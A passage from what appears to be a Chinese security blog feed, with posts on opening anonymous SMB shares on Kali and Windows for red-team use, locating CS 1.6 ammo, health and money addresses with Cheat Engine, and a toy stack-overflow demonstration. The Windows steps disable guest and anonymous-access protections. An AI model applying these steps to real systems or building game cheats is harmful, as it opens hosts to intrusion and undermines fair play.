    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><p>修改文件<code>/etc/samba/smb.conf</code>，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">    map to guest = bad user</span><br><span class="line">    server role = standalone server</span><br><span class="line">    usershare allow guests = yes</span><br><span class="line">    idmap config * : backend = tdb</span><br><span class="line">    smb ports = 445</span><br><span class="line"></span><br><span class="line">[smb]</span><br><span class="line">    comment = Samba</span><br><span class="line">    path = /tmp/</span><br><span class="line">    guest ok = yes</span><br><span class="line">    read only = no</span><br><span class="line">    browsable = yes</span><br></pre></td></tr></table></figure><p>然后启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service smbd start </span><br><span class="line">service nmbd start </span><br></pre></td></tr></table></figure><p>然后挂在共享目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t cifs //192.168.50.28/ascotbe /tmp</span><br></pre></td></tr></table></figure><p>然后访问的Windows需要开启这个设置</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/SMBAnonymousAccessShare/1.png" alt="image-20220413201559044"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/SMBAnonymousAccessShare/2.png" alt="image-20220413201646299"></p><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>启用Guest用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user guest /active:yes</span><br></pre></td></tr></table></figure><p>将Everyone权限应用于匿名用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><p>指定匿名共享文件的位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; /v NullSessionShares /t REG_MULTI_SZ /d smb /f</span><br></pre></td></tr></table></figure><p>将Guest用户从策略“拒绝从网络访问这台计算机”中移除，导出组策略：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secedit /export /cfg gp.inf /quiet</span><br></pre></td></tr></table></figure><p>修改文件gp.inf，将<code>SeDenyNetworkLogonRight = Guest</code>修改为<code>SeDenyNetworkLogonRight =</code>，保存</p><p>重新导入组策略：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secedit /configure /db gp.sdb /cfg gp.inf /quiet</span><br></pre></td></tr></table></figure><p>强制刷新组策略，立即生效(否则，重启后生效)：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gpupdate/force</span><br></pre></td></tr></table></figure><p>设置文件共享</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\share\ /T /grant Everyone:r</span><br><span class="line">net share share=c:\share /grant:everyone,full</span><br></pre></td></tr></table></figure><p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为<code>//&lt;ip&gt;/smb</code></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="红蓝对抗" scheme="https://www.ascotbe.com/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="SMB" scheme="https://www.ascotbe.com/tags/SMB/"/>
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(二)</title>
    <link href="https://www.ascotbe.com/2022/04/04/CSGO_0x02/"/>
    <id>https://www.ascotbe.com/2022/04/04/CSGO_0x02/</id>
    <published>2022-04-04T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.610Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/00.jpg" alt="00" style="zoom:50%;" /></p><h3 id="搜索血量"><a href="#搜索血量" class="headerlink" title="搜索血量"></a>搜索血量</h3><p>在搜索血量的时候我按着之前子弹的办法来搜索，结果找不到具体的值，后面发现血量有可能是单浮点，而并不是我们看到的那个整数</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/24.png" alt="image-20220404161631724"></p><p>然后我们购买炸弹<code>o+4</code>进行购买，然后炸自己（别炸死了），就按这种方式一直搜索，然后找到黑色的地址通过验证子弹的方式来验证，最终找到如下临时地址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/25.png" alt="image-20220404161649203"></p><p>接着按着子弹的方式去找他的基址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/26.gif" alt="1"></p><p>然后搜索这个地址可以找到四个值，使用这个方法来查找</p><ul><li>为什么选这个地址？因为只有这个地址改变了，其他的没变</li><li>为什么要使用这个方法？因为使用了<code>找出是什么改写了这个地址</code>无法准确的定位到上一级的地址</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/27.png" alt="image-20220404174232438"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/28.png" alt="image-20220404174334902"></p><p>可以看到值在疯狂的刷新，然后再次搜索<strong>0A167E38</strong></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/29.png" alt="image-20220404174445723"></p><p>依旧找到了一个疯狂刷新的值，接着找到了<strong>0AA5DADC</strong>这个值，然后继续搜索</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/30.png" alt="image-20220404174758380"></p><p>看看我们发现了什么？和我们子弹的基址是一样的，那么我们就可以断定，这个值是我们当前角色的基址，而另一个是所有玩家的基址，最终我们得到了如下结果</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/31.png" alt="image-20220404175256378"></p><p>然后我们添加机器人验证，可以看到所有人血量的地址在变动，说明没错</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/32.gif" alt="2"></p><h3 id="搜索护甲"><a href="#搜索护甲" class="headerlink" title="搜索护甲"></a>搜索护甲</h3><p>我们使用<code>o+2</code>来进行购买护甲，然后按血量的方式进行搜索，找到一个值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/33.png" alt="image-20220404193310228"></p><p>然后我们使用<code>找出是什么访问了这个地址</code>，找到了地址<strong>0AA5DB5C</strong></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/34.png" alt="image-20220404193340728"></p><p>这个值是不是和我们之前的哪个血量很像，我们直接使用C/C++结构体的思维来去推测</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/35.png" alt="image-20220404193648609"></p><p>可以看到直接找到了护甲的值，同理可以推测出敌人的护甲值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/36.png" alt="image-20220404193931198"></p><p>我们进游戏进行验证</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/37.gif" alt="3"></p><h3 id="搜索金钱"><a href="#搜索金钱" class="headerlink" title="搜索金钱"></a>搜索金钱</h3><p>方式和上面一样找到后需要一个一个使用<code>找出是什么访问了这个地址</code></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/38.png" alt="image-20220404200345065"></p><p>可以看到我们熟悉的值，直接使用护甲一样的方式来定位，最终两个值如下</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/39.gif" alt="4"></p><p>可以看到我们把金钱锁定为100，然后右边显示的是16000，当我们购买枪支的时候，直接提示了金钱不足</p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO1.6-2.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="逆向" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/%E5%A4%96%E6%8C%82/"/>
    
    
    <category term="CSGO" scheme="https://www.ascotbe.com/tags/CSGO/"/>
    
    <category term="破解" scheme="https://www.ascotbe.com/tags/%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/tags/%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>CSGO破解学习(一)</title>
    <link href="https://www.ascotbe.com/2022/03/20/CSGO_0x01/"/>
    <id>https://www.ascotbe.com/2022/03/20/CSGO_0x01/</id>
    <published>2022-03-20T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.611Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/0.jpg" alt="0" style="zoom:50%;" /></p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li><p>CSGO1.6版本 </p><ul><li><a href="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO.7z.001">分卷1</a> </li><li><a href="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO.7z.002">分卷2</a></li><li><a href="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO.7z.003">分卷3</a></li></ul></li><li><p>Cheat Engine<a href="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/Cheat%20Engine%206.7.zip">下载地址</a></p></li></ul><h3 id="搜索子弹"><a href="#搜索子弹" class="headerlink" title="搜索子弹"></a>搜索子弹</h3><p>在正式开始前还是需要一些基本的使用知识，首先我们通过内存搜索子弹，然后基于二分法进行筛选数据</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/1.png" alt="image-20220320173819317"></p><p>上面是我们搜索出来的数据，暂时把它定义为<code>当前地图当前身份当前人物手持的这一把AK枪的子弹内存</code></p><blockquote><p>为什么要这样喊呢？因为在游戏里面会有多个数据结构环环嵌套，指针一个指向一个进行套娃</p></blockquote><p>我们通过：右键该内存-&gt;找出是什么改写了这个地址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/2.gif" alt="1"></p><p>然后我们点击手动添加地址把<strong>06F03960</strong>加上偏移CC，即可显示当前枪械的子弹</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/3.png" alt="image-20220320174237627"></p><p>所以<strong>06F03960</strong>就是我们上一级的地址，我们只需要使用新的扫描来搜索</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/4.png" alt="image-20220320174642541"></p><p>可以看到4个地址，接下来我们回到游戏，把主武器丢弃查看变化</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/5.gif" alt="2"></p><p>可以看到第一个地址的值变为了<strong>00000000</strong>，那我们可以知道这个地址是当前主武器的名称，而里面的<strong>06F03960</strong>是这个武器的名称。我们尝试丢弃主武器后重新换一把枪</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/6.gif" alt="3"></p><p>接下来把那个枪械的值<strong>06F03AB8</strong>进行替换，可以发现完全一样，论证完全没问题</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/7.png" alt="image-20220320194112655"></p><p>第四个值不变，那么这个值是没用的。</p><p>第二个和第三个的值在我们丢弃主武器和副武器都进行了变化，所以这两个值应该才是我们需要的。</p><p>首先查看第二个地址是什么修改了它，从图片可以看到ESI的值<strong>0A284310</strong>偏移是5E8</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/8.png" alt="image-20220320194809159"></p><p>而第三个地址技术无限刷新，应该是获取当前枪的名称用的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/9.png" alt="image-20220320202131390"></p><p>既然知道了这个值，我们就通过手动添加第三个地址的偏移，可以看到完全和我们的子弹一样。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/10.png" alt="image-20220320202533789"></p><p>所以这个地址就是当前枪支的子弹数，并且我们切换到副武器也是一样的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/11.gif" alt="4"></p><p>加下来继续搜索<strong>0A284310</strong>这个地址，可以看到有多个值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/12.png" alt="image-20220320204609570"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/13.png" alt="image-20220320210207377"></p><p>我们需要更换地图来进行筛选哪些值改变了，然后一个一个值的进行判断：</p><ul><li>找出是什么改写了这个地址</li><li>游戏中按H</li><li>更换地图进行查看</li><li>最终使用指针表示法来验证</li></ul><p>通过排除找到的地址进行验证，最终找到这个值是对的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/14.png" alt="image-20220320210354866"></p><p>可以看到地址是<strong>0AA49ADC</strong>并且偏移是7C，然后我们搜索得到3个绿色的基址</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/15.png" alt="image-20220320210534490"></p><p>通过断开游戏连接进行筛选只留下了这两个值</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/16.png" alt="image-20220320210712347"></p><p>还需要继续筛选，我们直接退出游戏然后在重新启动后附加进CE，再进行验证，可以看到哪两个值一个变为空了，我们手动添加进行查看，这个<strong>cstrike.exe+D6E63C</strong>基址没有错</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/17.gif" alt="5"></p><p>然后我们只需要锁定他切换地图都可以无限子弹了，包括退出游戏后重新进入（重新开机不行）</p><h3 id="子弹区分敌我"><a href="#子弹区分敌我" class="headerlink" title="子弹区分敌我"></a>子弹区分敌我</h3><p>由于测试了重新开机是否能够继续发现不行，然后这些数据就是重新搜索的。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/18.png" alt="image-20220322213441976"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/19.png" alt="image-20220322213506690"></p><p>我们可以看到我们锁定的数值在添加了BOT以后会无限的跳跃，而我们没有使用武器，并且队友都不需要切换弹药了（没录是因为录下来GIF太大了大家自行尝试）那么就可以断定这个值是代表所有人子弹的基址，我们就不能锁定它</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/20.gif" alt="1"></p><p>那我们换下一个基地在进行锁定</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/21.png" alt="image-20220323001430548"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/22.png" alt="image-20220323001445649"></p><p>可以从图中看到机器人已经有了换弹夹的动作，而我们的子弹是无限的，并且数据没有乱跳，这就说明这个基址才是我们的子弹数</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/23.gif" alt="2"></p><p>后面测试换地图也是没有问题的</p><h3 id="CT表下载"><a href="#CT表下载" class="headerlink" title="CT表下载"></a>CT表下载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/Ascotbe/Image/master/CSGO/CSGO1.6-1.CT</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="逆向" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/%E5%A4%96%E6%8C%82/"/>
    
    
    <category term="CSGO" scheme="https://www.ascotbe.com/tags/CSGO/"/>
    
    <category term="破解" scheme="https://www.ascotbe.com/tags/%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="外挂" scheme="https://www.ascotbe.com/tags/%E5%A4%96%E6%8C%82/"/>
    
  </entry>
  
  <entry>
    <title>Linux栈溢出总结（0x00）</title>
    <link href="https://www.ascotbe.com/2022/02/22/StackOverflow_Linux_0x00/"/>
    <id>https://www.ascotbe.com/2022/02/22/StackOverflow_Linux_0x00/</id>
    <published>2022-02-22T10:45:42.000Z</published>
    <updated>2023-01-05T06:17:01.849Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>距离第一篇栈溢出学习文章已经过去了1年半了，今天看到一篇文章终于解决了之前的一些疑惑，也理清了很多东西，记录一下，原文地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/cmLp5aHfqy1-wYiNiqdq-Q</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/50.gif" alt="图片"></p><h2 id="什么是栈"><a href="#什么是栈" class="headerlink" title="什么是栈"></a>什么是栈</h2><p>简单来说，<code>栈</code> 是一种 <code>LIFO（Last In Frist Out，后进先出）</code> 形式的数据结构。栈一般是从高地址向低地址增长，并且栈支持 <code>push（入栈）</code> 和 <code>pop（出栈）</code> 两个操作。如下图所示：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/42.png" alt="图片"></p><p><code>push</code> 操作先将 <code>栈顶（sp指针）</code> 向下移动一个位置，然后将数据写入到新的栈顶；而 <code>pop</code> 操作会从 <code>栈顶</code> 读取数据，并且将 <code>栈顶（sp指针）</code> 向上移动一个位置。</p><p>例如，将 0x100 压入栈，过程如下图所示：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/43.png" alt="图片"></p><p>我们再来看看 <code>出栈</code> 操作，如下图所示：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/44.png" alt="图片"></p><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p><code>栈帧</code>，也就是 <code>Sack Frame</code>，其本质就是一种栈，只是这种栈专门用于保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。</p><p><code>栈帧</code> 有 <code>栈顶</code> 和 <code>栈底</code> 之分，其中栈顶的地址最低，栈底的地址最高。SP(栈指针) 就是一直指向栈顶的。在 x86 的 32 位 CPU 中，我们用 <code>%ebp</code> 寄存器指向栈底，也就是基址指针；用 <code>%esp</code> 寄存器指向栈顶，也就是栈指针。下面是一个栈帧的示意图：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/45.png" alt="图片"></p><p>一般来说，我们将 <code>%ebp</code> 到 <code>%esp</code> 之间区域当做栈帧。并不是整个栈空间只有一个栈帧，每调用一个函数，就会生成一个新的栈帧。</p><p>在函数调用过程中，我们将调用函数的函数称为：<code>调用者(caller)</code>，将被调用的函数称为：<code>被调用者(callee)</code>。在这个过程中：</p><ul><li><code>调用者</code> 需要知道在哪里获取 <code>被调用者</code> 返回的值（一般存放到 <code>%eax</code> 寄存器）。</li><li><code>被调用者</code> 需要知道传入的参数在哪里和调用完后的返回地址在哪里。</li><li>我们需要保证在 <code>被调用者</code> 返回后，<code>%ebp</code> 和 <code>%esp</code> 寄存器的值应该和调用前一致。</li></ul><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>现在，我们来看看函数调用时，栈帧是如何变化的。</p><p>我们以一个函数调用的实例来解说，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// stack.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add_func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> c, d;</span><br><span class="line"></span><br><span class="line">    c = a;</span><br><span class="line">    d = b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c + d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> total;</span><br><span class="line"></span><br><span class="line">    total = add_func(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用命令 <code>gcc -S -m32 stack.c</code> 来编译上面的代码，获取的汇编代码如下所示（去掉一些无关紧要的信息）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add_func:</span><br><span class="line">    pushl   %ebp                // 保存ebp寄存器到栈</span><br><span class="line">    movl    %esp, %ebp          // 把ebp进程设置为esp的值</span><br><span class="line">    subl    $16, %esp           // 为局部变量申请空间</span><br><span class="line">    movl    8(%ebp), %eax       // 把参数a保存到eax寄存器中</span><br><span class="line">    movl    %eax, -8(%ebp)      // 把eax寄存器的值保存到局部变量c中（c = a）</span><br><span class="line">    movl    12(%ebp), %eax      // 把参数b保存到eax寄存器中</span><br><span class="line">    movl    %eax, -4(%ebp)      // 把eax寄存器到值保存到局部变量d中（d = b）</span><br><span class="line">    movl    -8(%ebp), %edx      // 把d的值保存到edx寄存器中</span><br><span class="line">    movl    -4(%ebp), %eax      // 把c的值保存到eax寄存器中</span><br><span class="line">    addl    %edx, %eax          // 将eax寄存器与edx寄存器的值相加，保存到eax中（返回值）</span><br><span class="line">    leave</span><br><span class="line">    ret                         // 函数返回</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>可能汇编代码比较难看懂，我们用下面的插图来说明这个调用过程：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/46.png" alt="图片"></p><p>如上图所示，调用过程如下：</p><ul><li>在 <code>main()</code> 函数调用 <code>add_func()</code> 函数前，先将调用 <code>add_func()</code> 函数的参数压栈。</li><li>在调用 <code>add_func()</code> 函数时，会将 <code>返回地址</code> 压栈，接着进入 <code>add_func()</code> 函数。</li><li><code>add_func()</code> 函数执行时，会将原来的 <code>ebp寄存器</code> 的值压栈，然后把 <code>ebp寄存器</code> 的设置为 <code>esp寄存器</code> 的值。</li><li>接着 <code>add_func()</code> 函数会为局部变量申请空间，也就是将 <code>esp寄存器</code> 向下移动。</li><li>然后把局部变量 <code>c</code> 设置为参数 <code>a</code> 的值，局部变量 <code>d</code> 设置为 参数 <code>b</code> 的值。</li><li>最后将局部变量 c 和 d 的值相加，放置到 <code>eax寄存器</code> 中（C语言规定以 <code>eax寄存器</code> 传递返回值），然后调用 <code>ret</code> 指令返回到 <code>main()</code> 函数。</li></ul><h2 id="函数返回"><a href="#函数返回" class="headerlink" title="函数返回"></a>函数返回</h2><p>上面介绍了 <code>函数调用</code> 的过程，现在我们来介绍一下函数调用完毕后，从被调用函数返回到原来的函数过程是如何处理的。</p><p>从 <code>add_func()</code> 函数的汇编代码可以看到，当被调用函数执行完毕返回到调用函数前，会执行 <code>leave</code> 指令，这条指令等价于：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl %ebp, %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure><p>这两条汇编指令的意思是，将 <code>esp寄存器</code> 和 <code>ebp寄存器</code> 恢复到调用函数前的值。</p><p>然后，调用 <code>ret</code> 指令返回到原来的函数。<code>ret</code> 指令会从栈顶获取 <code>返回地址</code>，然后跳转到（<code>jmp指令</code>）此地址继续执行。这时的 <code>栈帧</code> 的结构如下图所示：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/47.png" alt="图片"></p><h2 id="栈溢出攻击"><a href="#栈溢出攻击" class="headerlink" title="栈溢出攻击"></a>栈溢出攻击</h2><p>前面说了那么，都是为了 <code>栈溢出攻击</code> 这节作铺垫的。通过前面的学习，我们知道调用函数的 <code>参数</code> 、执行完函数后的 <code>返回地址</code> 和被调用函数的 <code>局部变量</code> 都是存放在栈中的。</p><p>如果在调用函数时，不小心将 <code>返回地址</code> 覆盖了，那么调用完函数后，将不会跳转到原来的函数继续执行，而是跳转到覆盖后的地址执行。如下图所示：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/48.png" alt="图片"></p><p>那么，怎样才能把 <code>返回地址</code> 覆盖呢？我们可以通过下面的例子来说明：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_SIZE 8   <span class="comment">// 指针的大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EBP_SIZE 8   <span class="comment">// ebp寄存器的大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inject_callback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;inject_callback called...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func_call</span><span class="params">(<span class="type">char</span> *addr, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tmpBuf[<span class="number">16</span>] = &#123;<span class="number">0xff</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(tmpBuf + <span class="number">16</span> + EBP_SIZE, addr, len);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func_call called...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> injectPtr = (<span class="type">uint64_t</span>)&amp;inject_callback;</span><br><span class="line"></span><br><span class="line">    func_call(&amp;injectPtr, PTR_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main exited...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用以下命令编译上面代码，并且执行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc stack-overflow.c -fno-stack-protector -o stack-overflow</span><br><span class="line">$ ./stack-overflow</span><br><span class="line">func_call called...</span><br><span class="line">inject_callback called...</span><br></pre></td></tr></table></figure><blockquote><p>在编译上面程序时，一定要加上 <code>-fno-stack-protector</code> 参数，否则将会触发栈溢出保护，导致执行失败。</p></blockquote><p>在上面的代码中，我们并没有直接调用 <code>inject_callback()</code> 函数，而是通过把 <code>inject_callback()</code> 函数的地址复制到 <code>func_call()</code> 函数的局部变量 <code>tmpBuf</code> 中。</p><p>由于局部变量 <code>tmpBuf</code> 的类型为字符串数组，而且大小为 16 个字节。但我们复制数据是从 24（16 + 8）处开始复制，已经超出了局部变量 <code>tmpBuf</code> 的大小，如下图所示：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/StackOverflow/49.png" alt="图片"></p><p>从上图可以看出，<code>func_call()</code> 函数在调用 <code>memcpy()</code> 函数复制数据时，由于不小心用 <code>inject_callback()</code> 函数的地址覆盖了返回地址，导致 <code>func_call()</code> 函数执行完毕后，跳转到 <code>inject_callback()</code> 函数处执行。</p><p>这就是 <code>栈溢出攻击</code> 的原理，而导致 <code>栈溢出攻击</code> 的原因就是：调用 <code>memcpy()</code>、<code>strcpy()</code> 等函数复制数据时，没有对数据的长度进行验证，从而 <code>返回地址</code> 被复制的数据覆盖了。</p><p>黑客可以利用 <code>栈溢出攻击</code> 来把函数的返回地址修改成入侵代码的地址，从而实现攻击的目的。</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="逆向" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="堆栈" scheme="https://www.ascotbe.com/categories/%E9%80%86%E5%90%91/%E5%A0%86%E6%A0%88/"/>
    
    
    <category term="栈" scheme="https://www.ascotbe.com/tags/%E6%A0%88/"/>
    
    <category term="溢出" scheme="https://www.ascotbe.com/tags/%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Windows学习笔记</title>
    <link href="https://www.ascotbe.com/2021/12/01/WindowsStudyNotes/"/>
    <id>https://www.ascotbe.com/2021/12/01/WindowsStudyNotes/</id>
    <published>2021-12-01T15:58:53.000Z</published>
    <updated>2023-01-05T06:17:01.849Z</updated>
    
